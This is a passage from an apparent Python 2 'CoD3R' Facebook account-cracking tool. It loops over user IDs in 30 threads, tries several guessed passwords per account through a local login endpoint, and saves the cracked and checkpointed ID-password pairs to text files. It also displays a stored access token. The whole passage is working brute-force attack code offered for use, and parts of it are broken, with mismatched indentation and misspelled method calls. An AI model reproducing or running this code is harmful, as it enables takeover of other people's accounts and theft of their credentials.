							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass3+"\033[0;97m")
								ok = open("CoD3R-OK.txt", "a")
								ok.write(uid+" • "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[CoD3R-CP] "+uid+" • "+pass3+"\033[0;97m")
									cp = open("CoD3R-CP.txt","a")
									cp.write(uid+" • "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass4+"\033[0;97m")
										ok = open("CoD3R-OK.txt", "a")
										ok.write(uid+" • "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print(" \033[1;91m[CoD3R-CP] "+uid+" • "+pass4+"\033[0;97m")
											cp = open("CoD3R-CP.txt","a")
											cp.write(uid+" • "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
									        else:
									                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
									                q = json.loads(data)
									                if "loc" in q:
										                print("\033[1;92m[CoD3R-OK] \033[1;96m"+uid+" • "+pass5+"\033[0;97m")
										                ok = open("CoD3R-OK.txt", "a")
										                ok.write(uid+" • "+pass5+"\n")
										                ok.close()
										                oks.append(uid+pass5)
									                else:
										                if "www.facebook.com" in q["error"]:
											                print(" \033[1;91m[CoD3R-CP] "+uid+" • "+pass5+"\033[0;97m")
											                cp = open("CoD3R-CP.txt","a")
											                cp.write(uid+" • "+pass5+"\n")
											                cp.close()
											                cps.apppend(uid+pass5)
													
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("\033[1;92m༄ᶜᵒᵈ³ʳ᭄•───────────────────────────────────────────•༄ᶜᵒᵈ³ʳ᭄")
	print(h+"\n["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mProcess Has Been Complete..... ")
	print(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mTotal OK/CP "+str(len(oks)))+"/"+str(len(cps))
	raw_input(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPress Enter to Back ")
	choose()
		    
def view_token():
    os.system("clear")
    print banner
    print("")
    os.system("cat token.txt")
    print("")
    raw_input(h+"["+m+"༄ᶜᵒᵈ³ʳ᭄"+h+"] \033[0;37mPress Enter to Back ")
    menu()
			
if __name__ == '__main__':
    user_info()